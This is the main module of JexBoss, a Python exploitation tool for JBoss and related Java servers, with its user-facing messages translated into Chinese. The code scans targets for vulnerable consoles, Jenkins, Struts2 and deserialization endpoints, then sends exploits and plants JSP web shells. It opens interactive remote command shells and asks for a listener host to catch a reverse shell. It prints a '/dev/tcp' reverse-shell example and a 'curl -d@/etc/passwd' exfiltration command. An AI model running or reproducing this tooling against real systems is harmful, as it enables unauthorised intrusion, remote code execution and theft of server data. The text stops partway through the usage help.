#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module to group exploits of the JexBoss
https://github.com/joaomatosf/jexboss

Copyright 2013 João Filho Matos Figueiredo

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""
"""
JexBoss: JBoss 验证与漏洞利用工具
https://github.com/joaomatosf/jexboss

版权所有 2013 João Filho Matos Figueiredo

根据 Apache 许可证 2.0 版本授权
（"许可证"）；除非符合许可证要求，否则不得使用此文件。
您可以在以下网址获取许可证副本：

    http://www.apache.org/licenses/LICENSE-2.0

除非适用法律要求或书面同意，否则按"原样"分发软件，
没有任何明示或暗示的保证或条件。
请参阅许可证了解具体的语言权限和限制。
"""
import textwrap
import traceback
import logging
import datetime
import signal
import _exploits
import _updates
from os import name, system
import os, sys
import shutil
from zipfile import ZipFile
from time import sleep
from random import randint
import argparse, socket
from sys import argv, exit, version_info
logging.captureWarnings(True)
FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
logging.basicConfig(filename='jexboss_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)

__author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
__version__ = "1.2.4"

RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'


def print_and_flush(message, same_line=False):
    if same_line:
        print (message),
    else:
        print (message)
    if not sys.stdout.isatty():
        sys.stdout.flush()


if version_info[0] == 2 and version_info[1] < 7:
    print_and_flush(RED1 + BOLD + "\n * 您正在使用 Python 2.6 版本。JexBoss 需要版本 >= 2.7。\n"
                        "" + GREEN + "   请安装 Python 版本 >= 2.7。\n\n"
                                     "   CentOS 使用软件集合 (scl) 的示例:\n"
                                     "   # yum -y install centos-release-scl\n"
                                     "   # yum -y install python27\n"
                                     "   # scl enable python27 bash\n" + ENDC)
    logging.CRITICAL('Python version 2.6 is not supported.')
    exit(0)

try:
    import readline
    readline.parse_and_bind('set editing-mode vi')
except:
    logging.warning('Module readline not installed. The terminal will not support the arrow keys.', exc_info=traceback)
    print_and_flush(RED1 + "\n * 未安装 readline 模块。终端将不支持方向键功能。\n" + ENDC)


try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

try:
    from urllib3.util import parse_url
    from urllib3 import PoolManager
    from urllib3 import ProxyManager
    from urllib3 import make_headers
    from urllib3.util import Timeout
except ImportError:
    print_and_flush(RED1 + BOLD + "\n * 未安装 urllib3 包。请在继续前安装依赖项。\n"
                        "" + GREEN + "   示例: \n"
                                     "   # pip install -r requires.txt\n" + ENDC)
    logging.critical('Module urllib3 not installed. See details:', exc_info=traceback)
    exit(0)

try:
    import ipaddress
except:
    print_and_flush(RED1 + BOLD + "\n * 未安装 ipaddress 包。请在继续前安装依赖项。\n"
                        "" + GREEN + "   示例: \n"
                                     "   # pip install -r requires.txt\n" + ENDC)
    logging.critical('Module ipaddress not installed. See details:', exc_info=traceback)
    exit(0)

global gl_interrupted
gl_interrupted = False
global gl_args
global gl_http_pool


def get_random_user_agent():
    user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
                   "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
                   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
                   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
                   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
                   "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
                   "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
                   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
                   "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]
    return user_agents[randint(0, len(user_agents) - 1)]


def is_proxy_ok():
    print_and_flush(GREEN + "\n ** 正在检查代理: %s **\n\n" % gl_args.proxy)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    try:
        r = gl_http_pool.request('GET', gl_args.host, redirect=False, headers=headers)
    except:
        print_and_flush(RED + " * 错误: 无法通过代理 %s 连接到 %s。\n"
                              "   查看日志获取更多详情...\n" %(gl_args.host,gl_args.proxy) + ENDC)
        logging.warning("Failed to connect to %s using proxy" %gl_args.host, exc_info=traceback)
        return False

    if r.status == 407:
        print_and_flush(RED + " * 错误 407: 需要代理认证。\n"
                                      "   请输入正确的用户名和密码进行认证。\n"
                                      "   示例: -P http://proxy.com:3128 -L username:password\n" + ENDC)
        logging.error("Proxy authentication failed")
        return False

    elif r.status == 503 or r.status == 502:
        print_and_flush(RED + " * 错误 %s: 服务 %s 对您的代理不可用。\n"
                              "   查看日志获取更多详情...\n" %(r.status,gl_args.host)+ENDC)
        logging.error("Service unavailable to your proxy")
        return False
    else:
        return True


def configure_http_pool():

    global gl_http_pool

    if gl_args.mode == 'auto-scan' or gl_args.mode == 'file-scan':
        timeout = Timeout(connect=1.0, read=3.0)
    else:
        timeout = Timeout(connect=gl_args.timeout, read=6.0)

    if gl_args.proxy:
        # 使用代理时需要指定协议
        if (gl_args.host is not None and 'http' not in gl_args.host) or 'http' not in gl_args.proxy:
            print_and_flush(RED + " * 使用代理时，必须指定 http 或 https 协议"
                                  " (例如 http://%s)。\n\n" %(gl_args.host if 'http' not in gl_args.host else gl_args.proxy) +ENDC)
            logging.critical('Protocol not specified')
            exit(1)

        try:
            if gl_args.proxy_cred:
                headers = make_headers(proxy_basic_auth=gl_args.proxy_cred)
                gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, proxy_headers=headers, timeout=timeout, cert_reqs='CERT_NONE')
            else:
                gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE')
        except:
            print_and_flush(RED + " * 设置代理时出错。请查看日志详情...\n\n" +ENDC)
            logging.critical('Error while setting the proxy', exc_info=traceback)
            exit(1)
    else:
        gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')


def handler_interrupt(signum, frame):
    global gl_interrupted
    gl_interrupted = True
    print_and_flush ("正在中断执行...")
    logging.info("Interrupting execution ...")
    exit(1)

signal.signal(signal.SIGINT, handler_interrupt)


def check_connectivity(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((str(host), int(port)))
        s.close()
    except socket.timeout:
        logging.info("Failed to connect to %s:%s" %(host,port))
        return False
    except:
        logging.info("Failed to connect to %s:%s" % (host, port))
        return False

    return True


def check_vul(url):
    """
    测试对URL的GET请求是否成功
    :param url: 要测试的URL
    :return: 字典，键为漏洞类型，值为HTTP状态码
    """
    url_check = parse_url(url)
    if '443' in str(url_check.port) and url_check.scheme != 'https':
        url = "https://"+str(url_check.host)+":"+str(url_check.port)+str(url_check.path)

    print_and_flush(GREEN + "\n ** 正在检查主机: %s **\n" % url)
    logging.info("Checking Host: %s" % url)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}

    paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
             "web-console": "/web-console/Invoker",
             "JMXInvokerServlet": "/invoker/JMXInvokerServlet",
             "admin-console": "/admin-console/",
             "Application Deserialization": "",
             "Servlet Deserialization" : "",
             "Jenkins": "",
             "Struts2": "",
             "JMX Tomcat" : ""}

    fatal_error = False

    for vector in paths:
        r = None
        if gl_interrupted: break
        try:

            # 仅当专门选择时检查JMX Tomcat
            if (gl_args.jmxtomcat and vector != 'JMX Tomcat') or\
                    (not gl_args.jmxtomcat and vector == 'JMX Tomcat'): continue

            if gl_args.app_unserialize and vector != 'Application Deserialization': continue

            if gl_args.struts2 and vector != 'Struts2': continue

            if gl_args.servlet_unserialize and vector != 'Servlet Deserialization': continue

            if gl_args.jboss and vector not in ('jmx-console', 'web-console', 'JMXInvokerServlet', 'admin-console'): continue

            if gl_args.jenkins and vector != 'Jenkins': continue

            if gl_args.force:
                paths[vector] = 200
                continue

            print_and_flush(GREEN + " [*] 检查 %s: %s" % (vector, " " * (27 - len(vector))) + ENDC, same_line=True)

            # 检查Jenkins
            if vector == 'Jenkins':

                cli_port = None
                # 检查版本并搜索CLI-Port
                r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
                all_headers = r.getheaders()

                # 版本 > 658 不易受攻击
                if 'X-Jenkins' in all_headers:
                    version = int(all_headers['X-Jenkins'].split('.')[1].split('.')[0])
                    if version >= 638:
                        paths[vector] = 505
                        continue

                for h in all_headers:
                    if 'CLI-Port' in h:
                        cli_port = int(all_headers[h])
                        break

                if cli_port is not None:
                    paths[vector] = 200
                else:
                    paths[vector] = 505

            # 检查应用程序参数中的Java反序列化漏洞
            elif vector == 'Application Deserialization':

                r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
                if r.status in (301, 302, 303, 307, 308):
                    cookie = r.getheader('set-cookie')
                    if cookie is not None: headers['Cookie'] = cookie
                    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
                # link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
                obj = _exploits.get_serialized_obj_from_param(str(r.data), gl_args.post_parameter)

                # 如果没有序列化对象，检查是否有HTML刷新重定向并跟随
                if obj is None:
                    # 检查是否有重定向链接
                    link = _exploits.get_html_redirect_link(str(r.data))

                    # 如果是重定向链接，则跟随
                    if link is not None:
                        r = gl_http_pool.request('GET', url + "/" + link, redirect=True, headers=headers)
                        #link, obj = _exploits.get_param_value(r.data, gl_args.post_parameter)
                        obj = _exploits.get_serialized_obj_from_param(str(r.data), gl_args.post_parameter)

                # 如果对象仍为None
                if obj is None:
                    # 搜索其他可被利用的参数
                    list_params = _exploits.get_list_params_with_serialized_objs(str(r.data))
                    if len(list_params) > 0:
                        paths[vector] = 110
                        print_and_flush(RED + "  [ 检查其他参数 ]" + ENDC)
                        print_and_flush(RED + "\n * 参数 \"%s\" 似乎不易受攻击。\n" %gl_args.post_parameter +
                                                "   但还有其他参数可能易受攻击！\n" +ENDC+GREEN+
                                          BOLD+ "\n   尝试以下参数: \n" +ENDC)
                        for p in list_params:
                            print_and_flush(GREEN +  "      -H %s" %p+ ENDC)
                        print ("")
                elif obj is not None and obj == 'stateless':
                    paths[vector] = 100
                elif obj is not None:
                    paths[vector] = 200

            # 检查viewState中的Java反序列化漏洞
            elif vector == 'Servlet Deserialization':

                r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
                if r.status in (301, 302, 303, 307, 308):
                    cookie = r.getheader('set-cookie')
                    if cookie is not None: headers['Cookie'] = cookie
                    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)

                if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                    paths[vector] = 200
                else:
                    paths[vector] = 505

            elif vector == 'Struts2':

                result = _exploits.exploit_struts2_jakarta_multipart(url, 'jexboss', gl_args.cookies)
                if result is None or "无法获取命令" in str(result) :
                    paths[vector] = 100
                elif 'jexboss' in str(result) and "<html>" not in str(result).lower():
                    paths[vector] = 200
                else:
                    paths[vector] = 505

            elif vector == 'JMX Tomcat':

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(7)
                host_rmi = url.split(':')[0]
                port_rmi = int(url.split(':')[1])
                s.connect((host_rmi, port_rmi))
                s.send(b"JRMI\x00\x02K")
                msg = s.recv(1024)
                octets = str(msg[3:]).split(".")
                if len(octets) != 4:
                    paths[vector] = 505
                else:
                    paths[vector] = 200

            # 检查JBoss向量
            elif vector == "JMXInvokerServlet":
                # 用户提供web-console路径并检查JMXInvoker...
                if "/web-console/Invoker" in url:
                    paths[vector] = 505
                # 如果用户未提供路径，追加"/invoker/JMXInvokerServlet"
                else:

                    if not url.endswith(str(paths[vector])) and not url.endswith(str(paths[vector])+"/"):
                        url_to_check = url + str(paths[vector])
                    else:
                        url_to_check = url

                    r = gl_http_pool.request('HEAD', url_to_check , redirect=False, headers=headers)
                    # 如果不支持HEAD方法，尝试GET
                    if r.status in (405, 406):
                        r = gl_http_pool.request('GET', url_to_check , redirect=False, headers=headers)

                    # 如果是web-console/Invoker或invoker/JMXInvokerServlet
                    if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                        paths[vector] = 200
                    else:
                        paths[vector] = 505

            elif vector == "web-console":
                # 用户提供JMXInvoker路径并检查web-console...
                if "/invoker/JMXInvokerServlet" in url:
                    paths[vector] = 505
                # 如果用户未提供路径，追加"/web-console/..."
                else:

                    if not url.endswith(str(paths[vector])) and not url.endswith(str(paths[vector]) + "/"):
                        url_to_check = url + str(paths[vector])
                    else:
                        url_to_check = url

                    r = gl_http_pool.request('HEAD', url_to_check, redirect=False, headers=headers)
                    # 如果不支持HEAD方法，尝试GET
                    if r.status in (405, 406):
                        r = gl_http_pool.request('GET', url_to_check, redirect=False, headers=headers)

                    # 如果是web-console/Invoker或invoker/JMXInvokerServlet
                    if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
                        paths[vector] = 200
                    else:
                        paths[vector] = 505

            # 其他JBoss向量
            else:
                r = gl_http_pool.request('HEAD', url + str(paths[vector]), redirect=False, headers=headers)
                # 如果不支持HEAD方法，尝试GET
                if r.status in (405, 406):
                    r = gl_http_pool.request('GET', url + str(paths[vector]), redirect=False, headers=headers)
                # 检查服务器是否对所有请求响应200/500
                if r.status in (200, 500):
                    r = gl_http_pool.request('GET', url + str(paths[vector])+ '/github.com/joaomatosf/jexboss', redirect=False,headers=headers)

                    if r.status == 200:
                        r.status = 505
                    else:
                        r.status = 200

                paths[vector] = r.status

            # ----------------
            # 结果分析
            # ----------------
            # 检查代理是否不支持在目标相同端口上运行
            if r is not None and r.status == 400 and gl_args.proxy:
                if parse_url(gl_args.proxy).port == url_check.port:
                    print_and_flush(RED + "[ 错误 ]\n * 发生错误，因为代理服务器运行在\n"
                                       "   与服务器相同的端口上 (端口 %s)。\n"
                                       "   请在代理中使用不同的端口。\n" % url_check.port + ENDC)
                    logging.critical("Proxy returns 400 Bad Request because is running in the same port as the server")
                    fatal_error = True
                    break

            # 检查是否为假阳性
            if r is not None and len(r.getheaders()) == 0:
                print_and_flush(RED + "[ 错误 ]\n * 服务器 %s 不是HTTP服务器。\n" % url + ENDC)
                logging.error("The server %s is not an HTTP server." % url)
                for key in paths: paths[key] = 505
                break

            if paths[vector] in (301, 302, 303, 307, 308):
                url_redirect = r.get_redirect_location()
                print_and_flush(GREEN + "  [ 重定向 ]\n * 服务器重定向到: %s\n" % url_redirect)
            elif paths[vector] == 200 or paths[vector] == 500:
                if vector == "admin-console":
                    print_and_flush(RED + "  [ 已暴露 ]" + ENDC)
                    logging.info("Server %s: EXPOSED" %url)
                elif vector == "Jenkins":
                    print_and_flush(RED + "  [ 可能易受攻击 ]" + ENDC)
                    logging.info("Server %s: RUNNING JENKINS" %url)
                elif vector == "JMX Tomcat":
                    print_and_flush(RED + "  [ 可能易受攻击 ]" + ENDC)
                    logging.info("Server %s: RUNNING JENKINS" %url)
                else:
                    print_and_flush(RED + "  [ 易受攻击 ]" + ENDC)
                    logging.info("Server %s: VULNERABLE" % url)
            elif paths[vector] == 100:
                paths[vector] = 200
                print_and_flush(RED + "  [ 不确定 - 需要检查 ]" + ENDC)
                logging.info("Server %s: INCONCLUSIVE - NEED TO CHECK" % url)
            elif paths[vector] == 110:
                logging.info("Server %s: CHECK OTHERS PARAMETERS" % url)
            else:
                print_and_flush(GREEN + "  [ 正常 ]")
        except Exception as err:
            print_and_flush(RED + "\n * 连接主机 %s 时出错 (%s)\n" % (url, err) + ENDC)
            logging.info("An error occurred while connecting to the host %s" % url, exc_info=traceback)
            paths[vector] = 505

    if fatal_error:
        exit(1)
    else:
        return paths


def auto_exploit(url, exploit_type):
    """
    自动利用URL漏洞
    :param url: 要利用的URL
    :param exploit_type: 以下之一
    exploitJmxConsoleFileRepository: 在JBoss 4和5中测试有效
    exploitJmxConsoleMainDeploy:	 在JBoss 4和6中测试有效
    exploitWebConsoleInvoker:		 在JBoss 4中测试有效
    exploitJMXInvokerFileRepository: 在JBoss 4和5中测试有效
    exploitAdminConsole: 在JBoss 5和6中测试有效（使用默认密码）
    """
    if exploit_type in ("Application Deserialization", "Servlet Deserialization"):
        print_and_flush(GREEN + "\n * 正在准备向 %s 发送漏洞利用代码。请稍候...\n" % url)
    else:
        print_and_flush(GREEN + "\n * 正在向 %s 发送漏洞利用代码。请稍候...\n" % url)

    result = 505
    if exploit_type == "jmx-console":

        result = _exploits.exploit_jmx_console_file_repository(url)
        if result != 200 and result != 500:
            result = _exploits.exploit_jmx_console_main_deploy(url)

    elif exploit_type == "web-console":

        # 如果用户未提供路径
        if url.endswith("/web-console/Invoker") or url.endswith("/web-console/Invoker/"):
            url = url.replace("/web-console/Invoker", "")

        result = _exploits.exploit_web_console_invoker(url)
        if result == 404:
            host, port = get_host_port_reverse_params()
            if host == port == gl_args.cmd == None: return False
            result = _exploits.exploit_servlet_deserialization(url + "/web-console/Invoker", host=host, port=port,
                                                               cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget,
                                                               gadget_file=gl_args.load_gadget)
    elif exploit_type == "JMXInvokerServlet":

        # 如果用户未提供路径
        if url.endswith("/invoker/JMXInvokerServlet") or url.endswith("/invoker/JMXInvokerServlet/"):
            url = url.replace("/invoker/JMXInvokerServlet", "")

        result = _exploits.exploit_jmx_invoker_file_repository(url, 0)
        if result != 200 and result != 500:
            result = _exploits.exploit_jmx_invoker_file_repository(url, 1)
        if result == 404:
            host, port = get_host_port_reverse_params()
            if host == port == gl_args.cmd == None: return False
            result = _exploits.exploit_servlet_deserialization(url + "/invoker/JMXInvokerServlet", host=host, port=port,
                                                               cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget,
                                                               gadget_file=gl_args.load_gadget)

    elif exploit_type == "admin-console":

        result = _exploits.exploit_admin_console(url, gl_args.jboss_login)

    elif exploit_type == "Jenkins":

        host, port = get_host_port_reverse_params()
        if host == port == gl_args.cmd == None: return False
        result = _exploits.exploit_jenkins(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
                                                   gadget=gl_args.gadget, show_payload=gl_args.show_payload)
    elif exploit_type == "JMX Tomcat":

        host, port = get_host_port_reverse_params()
        if host == port == gl_args.cmd == None: return False
        result = _exploits.exploit_jrmi(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows)

    elif exploit_type == "Application Deserialization":

        host, port = get_host_port_reverse_params()

        if host == port == gl_args.cmd == gl_args.load_gadget == None: return False

        result = _exploits.exploit_application_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
                                                               param=gl_args.post_parameter, force=gl_args.force,
                                                               gadget_type=gl_args.gadget, show_payload=gl_args.show_payload,
                                                               gadget_file=gl_args.load_gadget)

    elif exploit_type == "Servlet Deserialization":

        host, port = get_host_port_reverse_params()

        if host == port == gl_args.cmd == gl_args.load_gadget == None: return False

        result = _exploits.exploit_servlet_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
                                                               gadget=gl_args.gadget, gadget_file=gl_args.load_gadget)

    elif exploit_type == "Struts2":

        result = 200

    # 如果看起来已利用（201表示使用gadget成功利用jboss）
    if result == 200 or result == 500 or result == 201:

        # 如果不是自动利用模式，询问是否继续...
        if not gl_args.auto_exploit:

            if exploit_type in ("Application Deserialization", "Jenkins", "JMX Tomcat", "Servlet Deserialization") or result == 201:
                print_and_flush(BLUE + " * 漏洞利用代码已成功发送。请检查您是否收到了反向shell连接\n"
                                       "   或您的命令是否已执行。\n"+ ENDC+
                                       "   按 [ENTER] 继续...\n")
                # 等待输入ENTER
                input().lower() if version_info[0] >= 3 else raw_input().lower()
                return True
            else:
                if exploit_type == 'Struts2':
                    shell_http_struts(url)
                else:
                    print_and_flush(GREEN + " * 代码部署成功！正在启动命令shell。请稍候...\n" + ENDC)
                    shell_http(url, exploit_type)

        # 如果是自动利用模式，打印消息并继续...
        else:
            print_and_flush(GREEN + " * 通过向量 %s 成功部署/发送代码\n *** 请在独立模式下运行JexBoss以打开命令shell。 ***" %(exploit_type) + ENDC)
            return True

    # 如果未成功利用，打印错误消息并要求输入ENTER
    else:
        if exploit_type == 'admin-console':
            print_and_flush(GREEN + "\n * 您仍然可以尝试利用ViewState中的反序列化漏洞！\n" +
                     "   尝试: python jexboss.py -u %s/admin-console/login.seam --app-unserialize\n" %url +
                     "   按 [ENTER] 继续...\n" + ENDC)

        else:
            print_and_flush(RED + "\n * 无法自动利用该漏洞。利用需要手动分析...\n" +
                                "   按 [ENTER] 继续...\n" + ENDC)
        logging.error("Could not exploit the server %s automatically. HTTP Code: %s" %(url, result))
        # 等待输入ENTER
        input().lower() if version_info[0] >= 3 else raw_input().lower()
        return False


def ask_for_reverse_host_and_port():
    print_and_flush(GREEN + " * 请输入您的监听服务器的IP地址和TCP端口以尝试获取反向SHELL。\n"
                            "   注意: 您也可以使用 --cmd \"命令\" 在服务器上运行特定命令。"+NORMAL)

    # 如果不是*nix系统（例如Windows上的git bash）
    if not sys.stdout.isatty():
        print_and_flush("   IP地址 (RHOST): ", same_line=True)
        host = input().lower() if version_info[0] >= 3 else raw_input().lower()
        print_and_flush("   端口 (RPORT): ", same_line=True)
        port = input().lower() if version_info[0] >= 3 else raw_input().lower()
    else:
        host = input("   IP地址 (RHOST): ").lower() if version_info[0] >= 3 else raw_input("   IP地址 (RHOST): ").lower()
        port = input("   端口 (RPORT): ").lower() if version_info[0] >= 3 else raw_input("   端口 (RPORT): ").lower()

    print ("")
    return str(host), str(port)


def get_host_port_reverse_params():
    # 如果在参数中提供了反向主机，则使用它
    if gl_args.reverse_host:

        if gl_args.windows:
            jexboss.print_and_flush(RED + "\n * WINDOWS 系统尚不支持反向SHELL。\n"
                                          "   请使用选项 --cmd 代替 --reverse-shell...\n" + ENDC +
                                    "   按 [ENTER] 继续...\n")
            # 等待输入ENTER
            input().lower() if version_info[0] >= 3 else raw_input().lower()
            return None, None

        tokens = gl_args.reverse_host.split(":")
        if len(tokens) != 2:
            host, port = ask_for_reverse_host_and_port()
        else:
            host = tokens[0]
            port = tokens[1]
    # 如果既没有提供命令也没有提供反向主机或加载gadget，则询问主机和端口
    elif gl_args.cmd is None and gl_args.load_gadget is None:
        host, port = ask_for_reverse_host_and_port()
    else:
        # 如果提供了命令或gadget文件
        host, port = None, None

    return host, port


def shell_http_struts(url):
    """
    连接到HTTP shell
    :param url: struts应用程序URL
    """
    print_and_flush("# ------------------------------------------------------------------------- #\n")
    print_and_flush(GREEN + BOLD + " * 要获取反向SHELL（例如meterpreter =），请输入类似以下命令: \n\n"
                    "\n" +ENDC+
                    "     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\n"
                    "   \n"+GREEN+
                    "   依此类推... =]\n" +ENDC
                    )
    print_and_flush("# ------------------------------------------------------------------------- #\n")

    resp = _exploits.exploit_struts2_jakarta_multipart(url,'whoami', gl_args.cookies)

    print_and_flush(resp.replace('\\n', '\n'), same_line=True)
    logging.info("Server %s exploited!" %url)

    while 1:
        print_and_flush(BLUE + "[输入命令或输入\"exit\"退出]" +ENDC)

        if not sys.stdout.isatty():
            print_and_flush("Shell> ", same_line=True)
            cmd = input() if version_info[0] >= 3 else raw_input()
        else:
            cmd = input("Shell> ") if version_info[0] >= 3 else raw_input("Shell> ")

        if cmd == "exit":
            break

        resp = _exploits.exploit_struts2_jakarta_multipart(url, cmd, gl_args.cookies)
        print_and_flush(resp.replace('\\n', '\n'))


# FIX: 捕获读取超时   File "jexboss.py", line 333, in shell_http
def shell_http(url, shell_type):
    """
    连接到HTTP shell
    :param url: 要连接的URL
    :param shell_type: 要连接的shell类型
    """
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}

    if gl_args.disable_check_updates:
        headers['no-check-updates'] = 'true'

    if shell_type == "jmx-console" or shell_type == "web-console" or shell_type == "admin-console":
        path = '/jexws4/jexws4.jsp?'
    elif shell_type == "JMXInvokerServlet":
        path = '/jexinv4/jexinv4.jsp?'

    gl_http_pool.request('GET', url+path, redirect=False, headers=headers)

    sleep(7)
    resp = ""
    print_and_flush("# ----------------------------------------- # LOL # ----------------------------------------- #\n")
    print_and_flush(RED + " * " + url + ": \n" + ENDC)
    print_and_flush("# ----------------------------------------- #\n")
    print_and_flush(GREEN + BOLD + " * 要获取反向SHELL（例如meterpreter），请输入命令: \n\n"
                                   "   jexremote=您的IP:您的端口\n\n" + ENDC + GREEN +
                    "   示例:\n" +ENDC+
                    "     Shell>jexremote=192.168.0.10:4444\n"
                    "\n" +GREEN+
                    "   或使用您选择的其他技术，例如:\n" +ENDC+
                    "     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\n"
                    "   \n"+GREEN+
                    "   依此类推... =]\n" +ENDC
                    )
    print_and_flush("# ----------------------------------------- #\n")

    for cmd in ['uname -a', 'cat /etc/issue', 'id']:
        cmd = urlencode({"ppp": cmd})
        try:
            r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
            resp += " " + str(r.data).split(">")[1]
        except:
            print_and_flush(RED + " * 似乎有IPS正在阻止某些请求。将禁用更新检查...\n\n"+ENDC)
            logging.warning("Disabling checking for updates.", exc_info=traceback)
            headers['no-check-updates'] = 'true'

    print_and_flush(resp.replace('\\n', '\n'), same_line=True)
    logging.info("Server %s exploited!" %url)

    while 1:
        print_and_flush(BLUE + "[输入命令或输入\"exit\"退出]" +ENDC)

        if not sys.stdout.isatty():
            print_and_flush("Shell> ", same_line=True)
            cmd = input() if version_info[0] >= 3 else raw_input()
        else:
            cmd = input("Shell> ") if version_info[0] >= 3 else raw_input("Shell> ")

        if cmd == "exit":
            break

        cmd = urlencode({"ppp": cmd})
        try:
            r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
        except:
            print_and_flush(RED + " * 联系命令shell时出错。请重试并查看日志详情...")
            logging.error("Error contacting the command shell", exc_info=traceback)
            continue

        resp = str(r.data)
        if r.status == 404:
            print_and_flush(RED + " * 联系命令shell时出错。请稍后重试...")
            continue
        stdout = ""
        try:
            stdout = resp.split("pre>")[1]
        except:
            print_and_flush(RED + " * 联系命令shell时出错。请稍后重试...")
        if stdout.count("处理JSP页面时发生异常") == 1:
            print_and_flush(RED + " * 执行命令 \"%s\" 时出错。 " % cmd.split("=")[1] + ENDC)
        else:
            print_and_flush(stdout.replace('\\n', '\n'))


def clear():
    """
    清空控制台
    """
    if name == 'posix':
        system('clear')
    elif name == ('ce', 'nt', 'dos'):
        system('cls')


def banner():
    """
    打印横幅
    """
    clear()
    print_and_flush(RED1 + "\n * ---- JexBoss: JBoss 验证与漏洞利用工具  ---- *\n"
                			 " | *   		及其他Java反序列化漏洞	      * | \n"
                			 " |						|\n"
                 			 " | @作者:  João Filho Matos Figueiredo		|\n"
                 			 " | @联系: joaomatosf@gmail.com			|\n"
                			 " |						|\n"
                			 " | @更新: https://github.com/joaomatosf/jexboss |\n"
                			 " #______________________________________________#\n")
    print_and_flush(RED1 + " @版本: %s" % __version__)
    print_and_flush (ENDC)


def help_usage():
    usage = (BOLD + BLUE + " 示例: [更多选项，请输入 python jexboss.py -h]\n" + ENDC +
    BLUE + "\n 简单用法，您必须提供要测试的主机名或IP地址 [-host 或 -u]:\n" +
    GREEN + "\n  $ python jexboss.py -u https://site.com.br" +

     BLUE + "\n\n 检测HTTP POST参数中的Java反序列化漏洞。\n"
            " 这将要求输入IP地址和端口以尝试获取反向SHELL:\n" +
     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize" +

     BLUE + "\n\n 检测自定义HTTP参数中的Java反序列化漏洞，\n"
            " 并发送要在被利用服务器上执行的自定义命令:\n" +
     GREEN + "\n  $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize\n"
             "    -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server'" +

     BLUE + "\n\n 检测Servlet中的Java反序列化漏洞 (如Invoker):\n"+
